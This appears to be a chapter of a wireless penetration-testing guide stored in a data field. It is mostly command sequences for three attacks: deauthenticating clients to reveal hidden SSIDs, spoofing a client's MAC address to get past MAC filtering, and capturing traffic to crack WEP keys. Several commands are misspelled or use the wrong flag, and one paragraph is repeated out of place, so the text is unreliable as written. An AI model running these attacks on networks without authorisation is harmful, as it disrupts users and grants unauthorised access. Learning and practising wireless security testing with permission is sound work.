- md: '

    ## Wireless Transmission Power adjustment


    The first step which needs to be done when you start working on a wireless penetration
    project is to adjust your wireless interface configuration based on the country
    and environment. Different countries have different transmission power levels
    and codes. Below, there is an example of how you can adjust your wireless interface
    card settings in US. We will configure the below parameters on the interface card:


    - TX power levels (set in dBm)

    - Configuring Country code

    - Configuring the level


    Commands we will use to change the wireless configuration are “iw” and “iwconfig”


    ```

    ifconfig wlan0 down -- To turn off the wireless

    iw reg set US -- To set the country to US

    iwconfig -- To check wireless configuration

    iwconfig wlan0 txpower 27 -- To change the transmit power to 27 dBm (Based on
    the country code the maximum transmit power is different)

    iwconfig wlan0 -- To check the wireless interface configuration

    ifconfig wlan0 up -- Brings up the wireless interface

    ```


    Once we have done all the above steps we should be ready to start the first wireless
    project.


    ## Discovering an AP which is hiding its SSID


    ![](img/c6b688dca6570d17db3036b560ef0905_51_0.png)


    When a wireless access point is configured, it can be set up to advertise its
    SSID (Access Point name) or hide it. It is easy to initiate an attack on an access
    point which is advertising its ID as we know the name. However; it is not so difficult
    to find the ID of an access point which is hidden. To find the SSID of an AP which
    is hidden you need to follow the below steps:


    - Start wireless monitoring with “airmon-ng” command. This will create a monitor
    interface called “mon0"

    - Discover the Aps with the “airodump-ng” command

    - At this stage you can wait for association of a client with the hidden AP and
    it will show the SSID. However; this might take some time and you can use airplay-ng
    to make it faster.

    - Below steps show how you can find the SSID name of an AP which is hidden:


    ```

    airmon-ng start wlan0 -- To create the monitoring interface

    airmon-ng -- To show and verify the interfaces and started service (mon0 and wlan0)

    airodump-ng mon0 -- Starts monitoring interface - Hidden wireless comes up with
    <Length: 0>. After a while it will show the SSID when devices associate with it

    airodump-ng -c 1 mon0 -- This will only listen for channel 1

    to find the SSID without waiting, copy the MAC address of the AP from the step
    above and follow the below steps:

    airplay-ng -0 2 -a 00:1B:11:60:17:3F mon0 -- This is basically a Deauth attack
    (-0 is deauth and 2 means twice)

    ```


    - After the Deauth attack the SSID will come up on airodump-ng output above as
    the clients will try to authenticate again


    ## Bypassing MAC address filtering on Wireless


    ![](img/c6b688dca6570d17db3036b560ef0905_53_0.png)


    Some Wireless Access Points might have another level of security which is MAC
    address filtering. Although this is a good practice to have this filter in place
    but it is not so difficult to crack it.


    - Steps you need to follow to bypass Mac address filtering

    - Find the AP as explained in previous section using airomon-ng & airodump-ng
    commands

    - Find an associated client using airodump-ng command

    - Borrow the MAC address using macchanger


    - Commands for the above steps

    - airomon-ng start wlan0

    - airodump-ng mon0

    - iwconfig wlan0 ssid Sneaky-SSID channel 4 -- To associate with Sneaky-SSID wireless

    - iwconfig wlan0 -- To check if the association is successful, which won''t be
    if there is a MAC filtering

    - airodump-ng -c 4 -ssid 00:1B:11:60:17:3F mon0 -- Only shows channel 4 and the
    bssid of AP and only show the associated clients with that AP (-a)


    - The output of the above command will show the station MAC address which is associated
    with the AP and you can use that MAC address

    - airmon-ng stop wlan0

    - macchanger -m 58:55:CA:F2:6F:Af wlan0 -- This will replace the wlan0 MAC address
    to a different one

    - ifconfig wlan0 down

    - ifconfig wlan0 up

    - iwconfig wlan0 ssid Sneaky-SSID channel 4


    ## Breaking Wireless WEP passwords


    ![](img/c6b688dca6570d17db3036b560ef0905_55_0.png)


    WEP passwords are the most insecure passwords on wireless devices. Follow the
    below steps to crack a WEP wireless password.


    - airmon-ng -- To find the wireless card name

    - airmon-ng stop [wireless card name]

    - airmon-ng start [wireless card name] -- will create monitoring of the wireless
    interface

    - airmon-ng -- To see and check the changes

    - airodump-ng [monitor interface name] -- To find the channel and bssid and essid

    - write down channel, bssid, essid and airodump-ng [monitor interface name] -c
    [channel] --bssid [bssid] -w [filename]

    - airodump-ng [monitor interface name] -c [channel] --bssid [bssid] -e [essid]
    -w [filename]

    - aircrack-ng [filename] -- To crack the password


    - After the Deauth attack the SSID will come up on airodump-ng output above as
    the clients will try to authenticate again


